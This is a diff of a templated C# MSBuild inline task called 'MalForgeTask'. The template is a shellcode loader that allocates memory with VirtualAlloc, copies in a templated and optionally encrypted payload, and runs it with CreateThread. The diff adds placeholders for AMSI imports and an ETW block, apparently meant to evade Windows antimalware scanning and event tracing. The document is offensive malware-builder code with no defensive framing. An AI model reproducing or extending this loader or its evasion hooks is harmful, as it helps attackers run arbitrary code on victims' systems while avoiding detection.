@@ -13,6 +13,7 @@
 using System;
 using System.Runtime.InteropServices;
 {{ crypto_using_fragment }}
+{{ amsi_imports }}
 using Microsoft.Build.Utilities;
 using Microsoft.Build.Framework;
 
@@ -28,12 +29,13 @@ public class MalForgeTask : Task
     static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr sa, IntPtr p, uint c, IntPtr t);
 
     [DllImport("kernel32.dll")]
-    static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);
+    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
 
     public override bool Execute()
     {
+    {{ etw_block }}
         byte[] {% if is_encrypted %}enc{% else %}buf{% endif %} = new byte[] { {{ shellcode }} };
-{{ decrypt_block }}
+    {{ decrypt_block }}
         IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x04);
         Marshal.Copy(buf, 0, addr, buf.Length);
         uint _vp;
